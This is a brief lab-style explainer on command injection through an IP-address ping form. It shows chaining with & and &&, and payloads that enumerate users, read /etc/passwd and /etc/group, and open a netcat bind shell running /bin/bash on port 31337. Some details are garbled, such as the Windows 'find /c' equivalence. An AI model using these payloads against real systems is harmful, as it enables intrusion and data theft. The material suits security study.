1. Type in IP address.( If it shows that there's no packages lost. It should be the right IP. )
2. Try to use some common commands e.g. dir, cd …
3. Try to use the parameters & and &&( & separates commands on a line meanwhile && executes this command only if previous command’s error level is 0. )

The main reason this is kind of dangerous is that when trying the command :
```
1| uname -a & users & id & w
```
There will be some discovery of the hostname, the user that are logged in. Why is it dangerous? Some of the personal info will be discovered by possibly attacker to start their attacking.

But it is much more than that once commands like :
```
1 | cat / etc/group
```
( Display info about the user groups its members on the target system. )
```
1 | cat /etc/passwd
```
( Linux-based system, more dets about users' specific file destination, such as root, daemon, bin and so much more. )

Moreover, commands includes " netcat ",  such as :
```
1 | netcat -v -e '/bin/bash' -l -p 31337
```
In conclusion, attackers will be able to execute some system commands that will allow them to obtain large amount of information.

"cat" equals to "find /c" in Windows, use "find /?" to find the correct way to use find.